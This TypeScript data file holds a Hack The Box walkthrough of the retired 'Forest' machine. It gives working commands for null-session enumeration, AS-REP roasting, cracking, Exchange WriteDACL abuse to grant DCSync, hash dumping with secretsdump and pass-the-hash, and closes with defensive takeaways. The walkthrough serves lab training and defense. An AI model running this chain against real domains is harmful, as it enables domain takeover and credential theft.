import type { WalkthroughDoc } from "./types";

export const forest: WalkthroughDoc = {
  slug: "forest",
  name: "Forest",
  platform: "Hack The Box",
  os: "Windows",
  difficulty: "Easy",
  retired: "Mar 2020",
  ip: "10.10.10.x",
  tags: [
    "Active Directory",
    "AS-REP Roasting",
    "Kerberos",
    "BloodHound",
    "WriteDACL",
    "DCSync",
    "Pass-the-Hash",
    "Evil-WinRM",
  ],
  lede: "A textbook Active Directory chain: dump the domain over a null session, AS-REP roast a pre-auth-disabled service account, then walk an ACL path through Exchange Windows Permissions to grant yourself DCSync and pass-the-hash into the Domain Controller.",
  summary: "Null-session enumeration finds svc-alfresco, AS-REP roasting cracks it, and an Exchange WriteDACL ACL abuse grants DCSync to dump the Administrator hash and pass-the-hash to root.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        { kind: "epigraph", text: "“You can't see the forest for the trees — or the WriteDACL for the ACLs.”" },
        { kind: "p", text: "**Forest** is an Easy-rated Windows machine and one of the cleanest teaching boxes for Active Directory. There is no web foothold, no CVE, no memory corruption — every step is a legitimate Kerberos or ACL feature being used exactly as designed, just against the wrong principal. The target is a Windows Server 2016 **Domain Controller** for the domain `htb.local`, and the whole path is credential- and permission-driven." },
        { kind: "p", text: "The intended route strings together four classic AD primitives — anonymous enumeration, AS-REP roasting, an Exchange split-permissions misconfiguration, and DCSync. Here is the complete chain from an unauthenticated scan to a `SYSTEM`-level shell:" },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**recon** — nmap flags a DC for `htb.local`",
            "**null session** — `rpcclient`/`enum4linux` dump domain users",
            "**svc-alfresco** — pre-auth disabled account found",
            "**AS-REP roast** — `GetNPUsers.py` → `$krb5asrep$23$`",
            "**crack** — `hashcat -m 18200` → `s3rvice`",
            "**evil-winrm** — shell as `svc-alfresco`, `user.txt`",
            "**BloodHound** — ACL path to Domain Admin",
            "**Exchange Windows Permissions** — group `WriteDACL` over the domain",
            "**Add-DomainObjectAcl** — grant ourselves DCSync",
            "**secretsdump** — DCSync the Administrator NTLM hash",
            "**pass-the-hash** — `psexec`/`evil-winrm -H` → `root.txt`",
          ],
        },
        { kind: "callout", variant: "note", title: "A pure AD box", text: "There is no IIS, no web application, and no service to exploit — Forest is about *identity*. If you go looking for a web port to attack you will waste an hour. The moment nmap shows Kerberos, LDAP and no HTTP, pivot straight to SMB/LDAP/RPC enumeration." },
      ],
    },
    {
      id: "recon",
      num: "01",
      title: "Enumeration",
      blocks: [
        { kind: "h3", text: "Port scan" },
        { kind: "p", text: "We start with a full TCP sweep to catch the high dynamic RPC ports, then a targeted service/script scan over the interesting ports. The result is the unmistakable fingerprint of a Domain Controller." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nmap -p- --min-rate 10000 -oA forest-allports 10.10.10.161",
            "$ nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA forest 10.10.10.161",
            "",
            "PORT     STATE SERVICE       VERSION",
            "53/tcp    open  domain        Simple DNS Plus",
            "88/tcp    open  kerberos-sec  Microsoft Windows Kerberos",
            "135/tcp   open  msrpc         Microsoft Windows RPC",
            "139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn",
            "389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: htb.local)",
            "445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)",
            "464/tcp   open  kpasswd5",
            "593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0",
            "636/tcp   open  ldapssl",
            "3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)",
            "5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)",
            "9389/tcp  open  mc-nmf        .NET Message Framing (AD Web Services)",
          ],
          highlight: [8, 9, 14],
        },
        { kind: "p", text: "The LDAP banner leaks the domain — **`htb.local`** — and the SMB banner leaks the OS — **Windows Server 2016 Standard build 14393**. Kerberos (88), LDAP (389/636/3268/3269), kpasswd (464) and AD Web Services (9389) together confirm this host *is* the DC, not just a domain member. Critically, **WinRM (5985)** is open: that is the intended shell vector once we have a credential." },
        { kind: "callout", variant: "tip", title: "Don't skip the full -p- scan", text: "The high dynamic RPC ports in the 49xxx range confirm the DC role and matter later for Impacket's RPC traffic. And because there is no HTTP/IIS anywhere, the only way in is over the AD protocols — so map `10.10.10.161` to `htb.local` (and `FOREST.htb.local`) in `/etc/hosts` and move on to RPC/LDAP." },
      ],
    },
    {
      id: "null-session",
      num: "02",
      title: "Null-session domain enumeration",
      blocks: [
        { kind: "p", text: "The DC permits an anonymous (null) session over RPC and LDAP, which means we can dump the entire domain user list without a single credential. `rpcclient` with an empty username and no password binds cleanly, and `enumdomusers` prints every account." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ rpcclient -U \"\" -N 10.10.10.161",
            "rpcclient $> enumdomusers",
            "user:[Administrator] rid:[0x1f4]",
            "user:[Guest] rid:[0x1f5]",
            "user:[krbtgt] rid:[0x1f6]",
            "user:[sebastien] rid:[0x479]",
            "user:[lucinda] rid:[0x47a]",
            "user:[svc-alfresco] rid:[0x47b]",
            "user:[andy] rid:[0x47e]",
            "user:[mark] rid:[0x47f]",
            "user:[santi] rid:[0x480]",
          ],
          highlight: [7],
        },
        { kind: "p", text: "The same list is reachable several other ways — useful redundancy if one anonymous bind is refused:" },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ enum4linux -a 10.10.10.161",
            "$ ldapsearch -x -H ldap://10.10.10.161 -b 'DC=htb,DC=local' '(objectClass=user)' sAMAccountName",
            "# with any valid creds you can also use:",
            "$ crackmapexec smb 10.10.10.161 --users",
          ],
        },
        { kind: "p", text: "Amid the built-in accounts and a swarm of Exchange `HealthMailbox*` and `SM_*` system mailboxes, a handful of real users stand out — `sebastien`, `lucinda`, `andy`, `mark`, `santi` — and one obvious service account: **`svc-alfresco`**. That name is our pivot." },
        { kind: "callout", variant: "warn", title: "Two things to note in the noise", text: "First, the `HealthMailbox*` / `SM_*` accounts mean **Exchange is installed** — bank that, it becomes the privilege-escalation vector. Second, build a clean `users.txt` from `enumdomusers` (strip the `rid:` prefixes) so the roasting step in the next stage has a tidy input list." },
      ],
    },
    {
      id: "asrep-roast",
      num: "03",
      title: "AS-REP roasting svc-alfresco",
      blocks: [
        { kind: "p", text: "`svc-alfresco` has the **`DONT_REQ_PREAUTH`** flag set (\"Do not require Kerberos preauthentication\") in its `userAccountControl`. Normally the KDC forces a client to prove it knows the password before issuing anything; with pre-auth disabled, the KDC will hand out an AS-REP encrypted with the account's password-derived key **to anyone who asks** — no credentials needed. Impacket's `GetNPUsers` requests exactly that and returns a crackable hash." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ impacket-GetNPUsers htb.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.161 -format hashcat",
            "# or targeted at the one account we care about:",
            "$ impacket-GetNPUsers htb.local/svc-alfresco -no-pass -dc-ip 10.10.10.161",
            "",
            "$krb5asrep$23$svc-alfresco@HTB.LOCAL:1f8c...<encrypted-blob>...b9",
          ],
          highlight: [4],
        },
        { kind: "p", text: "Every other user errors out — they require pre-auth, so the KDC refuses. Only `svc-alfresco` returns a `$krb5asrep$23$` blob, which is a **Kerberos 5 AS-REP with etype 23 (RC4)** — hashcat mode **18200**." },
        { kind: "callout", variant: "warn", title: "Right mode, right flag", text: "Use `-format hashcat` (or the john equivalent) so the output drops straight into a cracker. And note the mode is **18200** for AS-REP — not `13100`, which is TGS/Kerberoasting. The other accounts throwing \"Client not found\" / pre-auth-required errors is expected behaviour, not a failure." },
      ],
    },
    {
      id: "crack",
      num: "04",
      title: "Cracking the AS-REP hash",
      blocks: [
        { kind: "p", text: "The account's password is weak, so the AS-REP cracks in seconds against `rockyou.txt`. No rules, no masks — just a straight wordlist run." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt --force",
            "# john works just as well:",
            "$ john --wordlist=/usr/share/wordlists/rockyou.txt svc-alfresco.hash",
            "",
            "$krb5asrep$23$svc-alfresco@HTB.LOCAL:...:s3rvice",
          ],
          highlight: [4],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "Valid domain credentials — `svc-alfresco : s3rvice`. A service account with a five-character dictionary password is exactly why pre-auth-disabled accounts are so dangerous: the crack is instant." },
      ],
    },
    {
      id: "user",
      num: "05",
      title: "Foothold — Evil-WinRM and user.txt",
      blocks: [
        { kind: "p", text: "`svc-alfresco` is a member of **Remote Management Users**, so WinRM on 5985 accepts the credentials directly. Before connecting we can confirm access with CrackMapExec — a `Pwn3d!` means the account can get a shell." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice",
            "WINRM  10.10.10.161  5985  FOREST  [+] htb.local\\svc-alfresco:s3rvice (Pwn3d!)",
          ],
          highlight: [1],
        },
        { kind: "p", text: "Evil-WinRM gives a clean interactive PowerShell session as `htb\\svc-alfresco`. The user flag sits on the Desktop." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice",
            "*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents> type ..\\Desktop\\user.txt",
            "ad9e4034····························",
          ],
          highlight: [2],
        },
        { kind: "callout", variant: "note", title: "No payload needed", text: "This is the intended foothold — a legitimate remote-management protocol with legitimate credentials. There is nothing to smuggle past AV; Evil-WinRM is the clean shell. From here everything is post-exploitation inside the domain." },
      ],
    },
    {
      id: "bloodhound",
      num: "06",
      title: "Privesc recon — BloodHound maps the ACL path",
      blocks: [
        { kind: "epigraph", text: "“The shortest path to Domain Admin is rarely the obvious one.”" },
        { kind: "p", text: "With a domain foothold we collect the environment and let BloodHound do the graph analysis. We can gather remotely with `bloodhound-python`, or upload and run SharpHound from the WinRM session — either way we import the data and query the shortest path from `svc-alfresco` to Domain Admins." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -c All -ns 10.10.10.161",
            "# alternatively, from the shell:",
            "*Evil-WinRM* PS> .\\SharpHound.exe -c All",
            "# then import the resulting .zip into the BloodHound GUI",
          ],
        },
        { kind: "p", text: "Two facts fall out of the graph and together they are the whole escalation:" },
        {
          kind: "ul",
          items: [
            "`svc-alfresco` nests upward: **Service Accounts → Privileged IT Accounts → Account Operators**. Account Operators can create users and manage most non-protected groups.",
            "Because Exchange is installed, the **Exchange Windows Permissions** group holds a **`WriteDACL`** ACE over the domain object `DC=htb,DC=local` — the ability to rewrite the domain's own access-control list.",
          ],
        },
        { kind: "callout", variant: "key", title: "The path", text: "`svc-alfresco` (via Account Operators) can add a principal to **Exchange Windows Permissions**; that group's `WriteDACL` over the domain lets that principal grant *itself* the replication rights needed for **DCSync**. Chain them and we own the domain hashes." },
        { kind: "callout", variant: "warn", title: "Why the indirection is necessary", text: "Account Operators cannot touch protected groups like Domain Admins directly — the adminSDHolder process re-stamps their DACLs. The Exchange `WriteDACL` is the sideways move that gets us to the domain head. This ACE exists because of Exchange's split-permissions install model — a genuine real-world misconfiguration, not a box-specific gimmick." },
      ],
    },
    {
      id: "acl-abuse",
      num: "07",
      title: "ACL abuse — granting ourselves DCSync",
      blocks: [
        { kind: "p", text: "We execute the chain by hand. Using `svc-alfresco`'s Account Operators rights we create a fresh user we fully control, drop it into **Exchange Windows Permissions**, and give it WinRM access for good measure." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "*Evil-WinRM* PS> net user hacker Password123! /add /domain",
            "*Evil-WinRM* PS> net group \"Exchange Windows Permissions\" hacker /add",
            "*Evil-WinRM* PS> net localgroup \"Remote Management Users\" hacker /add",
          ],
        },
        { kind: "p", text: "Now the payoff. As a member of Exchange Windows Permissions, `hacker` inherits the group's `WriteDACL` over the domain object. We import PowerView and use `Add-DomainObjectAcl` to write a new ACE granting `hacker` the DS-Replication rights that constitute **DCSync**." },
        {
          kind: "code",
          lang: "powershell",
          label: "powershell — PowerView in the Evil-WinRM session",
          lines: [
            "*Evil-WinRM* PS> $pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
            "*Evil-WinRM* PS> $cred = New-Object System.Management.Automation.PSCredential('htb\\hacker', $pass)",
            "*Evil-WinRM* PS> Add-DomainObjectAcl -Credential $cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity hacker -Rights DCSync",
          ],
        },
        { kind: "callout", variant: "tip", title: "If you'd rather not do it by hand", text: "`aclpwn.py -f svc-alfresco -t htb.local` automates the whole create-user → add-to-group → `WriteDACL` → DCSync sequence. If `Add-DomainObjectAcl` fails, confirm the new user actually landed in Exchange Windows Permissions (`net group \"Exchange Windows Permissions\"`) and give AD a moment to replicate the group membership before writing the ACE." },
      ],
    },
    {
      id: "dcsync",
      num: "08",
      title: "DCSync — dumping the Administrator hash",
      blocks: [
        { kind: "p", text: "With replication rights on the domain, our `hacker` account can impersonate a DC and ask for any account's secrets. Impacket's `secretsdump` performs the DCSync over the network — no code execution on the target required — and pulls the NTLM hashes, including the Domain Administrator's." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ impacket-secretsdump htb.local/hacker:'Password123!'@10.10.10.161",
            "[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)",
            "Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::",
            "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::",
          ],
          highlight: [2],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "Administrator NTLM hash `aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6`. DCSync also dumps `krbtgt`, which would let us forge Golden Tickets — not needed for root here, but worth noting how total the compromise is." },
      ],
    },
    {
      id: "root",
      num: "09",
      title: "Root — pass-the-hash and root.txt",
      blocks: [
        { kind: "p", text: "We never need to crack the Administrator hash — NTLM authentication accepts the hash directly. **Pass-the-hash** with `psexec` gives a `SYSTEM` shell, or `evil-winrm -H` logs in as Administrator. Either reads the root flag." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ impacket-psexec htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6",
            "# or, for a cleaner PowerShell session as Administrator:",
            "$ evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6",
          ],
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "C:\\Windows\\system32> whoami",
            "nt authority\\system",
            "C:\\Windows\\system32> type C:\\Users\\Administrator\\Desktop\\root.txt",
            "b7f2 e0c1····························",
          ],
          highlight: [1, 3],
        },
        { kind: "callout", variant: "note", title: "Two ways up", text: "`psexec.py` runs as `NT AUTHORITY\\SYSTEM`; `evil-winrm -H` lands you as Administrator. Both can read `root.txt`. On a real engagement, remember to remove the ACE and the `hacker` account you created — the box self-reverts on reset, but the added DACL is precisely the artifact a defender would hunt for." },
      ],
    },
    {
      id: "defense",
      num: "10",
      title: "Defensive takeaways",
      blocks: [
        {
          kind: "ul",
          items: [
            "**Never disable Kerberos pre-authentication.** The `DONT_REQ_PREAUTH` flag on `svc-alfresco` is what enabled offline AS-REP roasting. Audit `userAccountControl` across the domain for this flag and clear it.",
            "**Enforce strong service-account passwords.** `s3rvice` cracked instantly. Prefer group Managed Service Accounts (gMSA) with long, random, machine-managed passwords so no wordlist ever reaches them.",
            "**Restrict anonymous enumeration of the DC.** The whole chain started with a null session dumping the user list. Set `RestrictAnonymous`, disable LDAP anonymous bind, and deny unauthenticated RPC enumeration.",
            "**Tighten Exchange split permissions.** The Exchange Windows Permissions group's `WriteDACL` over the domain object is a well-known escalation path. Remove or tightly scope that ACE and alert on any DACL modification of the domain head.",
            "**Treat Account Operators as tier-0.** Membership — and any nested group like Privileged IT Accounts that reaches it — grants sweeping account and group control. Minimise membership and audit the nesting.",
            "**Monitor for DCSync and sensitive-group changes.** Replication requests (`DS-Replication-Get-Changes`) from a non-DC principal, and unexpected additions to Exchange Windows Permissions, are high-fidelity signals that this exact ACL-abuse chain is under way.",
          ],
        },
        { kind: "callout", variant: "note", title: "Skills exercised", text: "null-session RPC/LDAP enumeration · AS-REP roasting · Kerberos hash cracking · Evil-WinRM foothold · BloodHound ACL analysis · Account Operators abuse · Exchange WriteDACL exploitation · DCSync via secretsdump · pass-the-hash." },
      ],
    },
  ],
};
